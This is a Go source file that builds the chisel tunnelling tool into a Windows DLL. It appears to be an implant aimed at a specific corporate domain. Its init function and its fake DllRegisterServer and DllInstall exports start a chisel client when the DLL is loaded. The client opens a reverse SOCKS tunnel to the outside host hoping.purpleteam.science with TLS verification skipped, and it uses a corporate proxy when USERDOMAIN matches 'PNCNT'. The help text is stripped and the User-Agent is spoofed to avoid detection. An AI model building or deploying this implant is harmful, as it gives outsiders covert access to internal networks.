package main

import "C"

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"

	chclient "github.com/jpillora/chisel/client"
	chserver "github.com/jpillora/chisel/server"
	chshare "github.com/jpillora/chisel/share"
	"github.com/jpillora/chisel/share/ccrypto"
	"github.com/jpillora/chisel/share/cos"
	"github.com/jpillora/chisel/share/settings"
)

var help = `
  Usage:  [command] [--help]

  Version: ` + chshare.BuildVersion + ` (` + runtime.Version() + `)

  Commands:
    server - runs  in server mode
    client - runs  in client mode

`

func rangeIn(low, hi int) int {
	rand.Seed(time.Now().UnixNano())
	return rand.Intn(hi-low+1) + low
}

//export InitializeNewDomain
func InitializeNewDomain() {
	DllInstall()
}

func init() {
	// This is Entry for DLL
	DllInstall()
}

//export EntryPoint
func EntryPoint() bool {
	return true
}

//export DllRegisterServer
func DllRegisterServer() bool {
	return true
}

//export DllUnregisterServer
func DllUnregisterServer() bool {
	return true
}

//export DllInstall
func DllInstall() bool {
	// This is entry for DLL
	version := flag.Bool("version", false, "")
	v := flag.Bool("v", false, "")
	flag.Bool("help", false, "")
	flag.Bool("h", false, "")
	flag.Usage = func() {}
	flag.Parse()

	if *version || *v {
		fmt.Println(chshare.BuildVersion)
		os.Exit(0)
	}

	args := []string{""}
	//args = flag.Args()
	//fmt.Print(args)
	fmt.Print("\n####\n")
	if os.Getenv("USERDOMAIN") == "PNCNT" {
		args = []string{"--tls-skip-verify", "--proxy", "http://pz-proxy.pncint.net:80", "https://hoping.purpleteam.science:443", fmt.Sprintf("R:%d:socks", rangeIn(2000, 65500))}
	} else {
		args = []string{"--tls-skip-verify", "https://hoping.purpleteam.science:443", fmt.Sprintf("R:165.227.194.40:%d:socks", rangeIn(2000, 65500))}
	}

	fmt.Print("\n#####\n")
	fmt.Print(args)
	fmt.Print("\n###\n")

	client(args)
	return true
}

func main() {
	DllInstall()
	//version := flag.Bool("version", false, "")
	//v := flag.Bool("v", false, "")
	//flag.Bool("help", false, "")
	//flag.Bool("h", false, "")
	//flag.Usage = func() {}
	//flag.Parse()
	//
	//if *version || *v {
	//	fmt.Println(chshare.BuildVersion)
	//	os.Exit(0)
	//}
	//
	//args := flag.Args()
	//
	//subcmd := ""
	//if len(args) > 0 {
	//	subcmd = args[0]
	//	args = args[1:]
	//}
	//
	//switch subcmd {
	//case "server":
	//	server(args)
	//case "client":
	//	client(args)
	//default:
	//	fmt.Print(help)
	//	os.Exit(0)
	//}
}

var commonHelp = `
  --help, This help text

`

func generatePidFile() {
	pid := []byte(strconv.Itoa(os.Getpid()))
	if err := ioutil.WriteFile("soap.pid", pid, 0644); err != nil {
		log.Fatal(err)
	}
}

var serverHelp = `
  Usage: (ee) sr [os]

  Options:

    --host, De

    --port, -p, De

    --key, .

    --keygen, .

    --keyfile, .

    --authfile, .

    --auth, .

    --keepalive, An .

    --backend, Specifies another

    --tls-key, .

    --tls-cert, .

    --tls-domain, .

    --tls-ca, . 
` + commonHelp

func server(args []string) {

	flags := flag.NewFlagSet("server", flag.ContinueOnError)

	config := &chserver.Config{}
	flags.StringVar(&config.KeySeed, "key", "", "")
	flags.StringVar(&config.KeyFile, "keyfile", "", "")
	flags.StringVar(&config.AuthFile, "authfile", "", "")
	flags.StringVar(&config.Auth, "auth", "", "")
	flags.DurationVar(&config.KeepAlive, "keepalive", 25*time.Second, "")
	flags.StringVar(&config.Proxy, "proxy", "", "")
	flags.StringVar(&config.Proxy, "backend", "", "")
	flags.BoolVar(&config.Socks5, "socks5", false, "")
	flags.BoolVar(&config.Reverse, "reverse", false, "")
	flags.StringVar(&config.TLS.Key, "tls-key", "", "")
	flags.StringVar(&config.TLS.Cert, "tls-cert", "", "")
	flags.Var(multiFlag{&config.TLS.Domains}, "tls-domain", "")
	flags.StringVar(&config.TLS.CA, "tls-ca", "", "")

	host := flags.String("host", "", "")
	p := flags.String("p", "", "")
	port := flags.String("port", "", "")
	pid := flags.Bool("pid", false, "")
	verbose := flags.Bool("v", false, "")
	keyGen := flags.String("keygen", "", "")

	flags.Usage = func() {
		fmt.Print(serverHelp)
		os.Exit(0)
	}
	flags.Parse(args)

	if *keyGen != "" {
		if err := ccrypto.GenerateKeyFile(*keyGen, config.KeySeed); err != nil {
			log.Fatal(err)
		}
		return
	}

	if config.KeySeed != "" {
		log.Print("Option `--key` is deprecated and will be removed in a future version of soap.")
		log.Print("Please use `(exename) server --keygen /file/path`, followed by `(exename) server --keyfile /file/path` to specify the SSH private key")
	}

	if *host == "" {
		*host = os.Getenv("HOST")
	}
	if *host == "" {
		*host = "0.0.0.0"
	}
	if *port == "" {
		*port = *p
	}
	if *port == "" {
		*port = os.Getenv("PORT")
	}
	if *port == "" {
		*port = "8080"
	}
	if config.KeyFile == "" {
		config.KeyFile = settings.Env("KEY_FILE")
	} else if config.KeySeed == "" {
		config.KeySeed = settings.Env("KEY")
	}
	s, err := chserver.NewServer(config)
	if err != nil {
		log.Fatal(err)
	}
	s.Debug = *verbose
	if *pid {
		generatePidFile()
	}
	go cos.GoStats()
	ctx := cos.InterruptContext()
	if err := s.StartContext(ctx, *host, *port); err != nil {
		log.Fatal(err)
	}
	if err := s.Wait(); err != nil {
		log.Fatal(err)
	}
}

type multiFlag struct {
	values *[]string
}

func (flag multiFlag) String() string {
	return strings.Join(*flag.values, ", ")
}

func (flag multiFlag) Set(arg string) error {
	*flag.values = append(*flag.values, arg)
	return nil
}

type headerFlags struct {
	http.Header
}

func (flag *headerFlags) String() string {
	out := ""
	for k, v := range flag.Header {
		out += fmt.Sprintf("%s: %s\n", k, v)
	}
	return out
}

func (flag *headerFlags) Set(arg string) error {
	index := strings.Index(arg, ":")
	if index < 0 {
		return fmt.Errorf(`Invalid header (%s). Should be in the format "HeaderName: HeaderContent"`, arg)
	}
	if flag.Header == nil {
		flag.Header = http.Header{}
	}
	key := arg[0:index]
	value := arg[index+1:]
	flag.Header.Set(key, strings.TrimSpace(value))
	flag.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36")
	return nil
}

var clientHelp = `
  Usage: (ee) clnt [ops] <sr> <re> [re] [re] ...

  <ser> is the URL to the (ee) server.

    <ll-ht>:<ll-pt>:<re-ht>:<rte-prt>/<pol>

  which shs <rt>:<rt> from the sr to the ct
  as <ll-ht>:<ll-pt>, or:

  Options:

    --fingerprint, .

    --auth, .

    --keepalive, .

    --max-retry-count, .

    --max-retry-interval,.

    --header, 

    --hostname, .
` + commonHelp

func client(args []string) {
	flags := flag.NewFlagSet("client", flag.ContinueOnError)
	config := chclient.Config{Headers: http.Header{}}
	flags.StringVar(&config.Fingerprint, "fingerprint", "", "")
	flags.StringVar(&config.Auth, "auth", "", "")
	flags.DurationVar(&config.KeepAlive, "keepalive", 25*time.Second, "")
	flags.IntVar(&config.MaxRetryCount, "max-retry-count", -1, "")
	flags.DurationVar(&config.MaxRetryInterval, "max-retry-interval", 0, "")
	flags.StringVar(&config.Proxy, "proxy", "", "")
	flags.StringVar(&config.TLS.CA, "tls-ca", "", "")
	flags.BoolVar(&config.TLS.SkipVerify, "tls-skip-verify", false, "")
	flags.StringVar(&config.TLS.Cert, "tls-cert", "", "")
	flags.StringVar(&config.TLS.Key, "tls-key", "", "")
	flags.Var(&headerFlags{config.Headers}, "header", "")
	hostname := flags.String("hostname", "", "")
	sni := flags.String("sni", "", "")
	pid := flags.Bool("pid", false, "")
	verbose := flags.Bool("v", false, "")
	flags.Usage = func() {
		fmt.Print(clientHelp)
		os.Exit(0)
	}
	flags.Parse(args)
	//pull out options, put back remaining args
	args = flags.Args()
	if len(args) < 2 {
		log.Fatalf("A server and least one remote is required")
	}
	config.Server = args[0]
	config.Remotes = args[1:]
	//default auth
	if config.Auth == "" {
		config.Auth = os.Getenv("AUTH")
	}
	//move hostname onto headers
	if *hostname != "" {
		config.Headers.Set("Host", *hostname)
		config.TLS.ServerName = *hostname
	}

	if *sni != "" {
		config.TLS.ServerName = *sni
	}

	//ready
	c, err := chclient.NewClient(&config)
	if err != nil {
		log.Fatal(err)
	}
	c.Debug = *verbose
	if *pid {
		generatePidFile()
	}
	go cos.GoStats()
	ctx := cos.InterruptContext()
	if err := c.Start(ctx); err != nil {
		log.Fatal(err)
	}
	if err := c.Wait(); err != nil {
		log.Fatal(err)
	}
}
